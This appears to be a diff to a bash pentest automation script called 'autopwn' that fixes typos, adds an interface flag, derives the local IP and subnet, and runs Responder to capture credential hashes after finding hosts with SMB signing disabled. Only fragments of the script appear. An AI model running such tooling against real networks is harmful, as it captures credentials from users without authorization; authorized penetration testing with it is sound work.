@@ -31,10 +31,10 @@ fi
 
 #make a dir for logs
 #after running into directory collisions, let's do a basic directory check instead of just mkdir and letting it error if it alreadt exists
-echo -e "Making sure a log directory exists - if not, ;et's create it"
+echo -e "Making sure a log directory exists - if not, let's create it"
 DIRECTORY="./autopwn_logs"
 if [ ! -d "$DIRECTORY" ]; then
-  echo -e "Creating a log directory because I guess we're supposed to and it's cleaner"
+  echo -e "${RED}Creating a log directory because I guess we're supposed to and it's cleaner${NC}"
   mkdir autopwn_logs
 fi
 
@@ -46,11 +46,27 @@ fi
 #scratch that - first we are going to identify computers with SMB signing disabled. Otherwise, Responder doesn't help much
 #Also, scratch THAT. Third time is the charm. First, we find our IP and subnet info, THEN we find unsigned SMB, THEN we run responder, THEN WE FIRE THE MISSILES!!
 
+#LEt's make sure we get the networking bits right
+#Strange that I've used the word "bits" several times lately.... in conjkunction with IT. I think I picked it up from watching Bluey with my daughter
+#But it also works as an IT joke
+
+if [[ $# -eq 0 ]] ; then
+    echo -e "\n${RED}[!] Make sure you run this using '-i {interface}'"
+    exit 0
+fi
 
 
-prolly_the_right_IP=$(ip addr show eth0 | awk '/inet /{print $2; exit}' | cut -d/ -f1)
+interface=''
+while getopts 'i:' flag; do
+    case "${flag}" in
+        i) interface=${OPTARG};;
+    esac
+done
+
+#Remember to go back and delete this, it's just for t-shooting
+prolly_the_right_IP=$(ip addr show ${interface} | awk '/inet /{print $2; exit}' | cut -d/ -f1)
 echo -e "${GREEN}Your IP is $prolly_the_right_IP"
-wut_subnet=$(echo $prolly_the_right_IP | cut -f 1,2,3 -d ".").0/24
+wut_subnet=$(ip addr show ${interface} | awk '/inet /{print $2; exit}' | cut -d/ -f2)
 echo -e "${GREEN}Your subnet is $wut_subnet. Pwning will commence in 3....2....1....${NC}"
 
 unsigned() {
@@ -92,7 +108,7 @@ more_hashes_plz(){
       systemctl start checkfile
       echo -e "${GREEN}[+] Checkfile daemon installed successfully (I think)"
     fi
-    responder -I eth0
+    responder -I ${interface}
   }
 #unsigned
 #recon_one
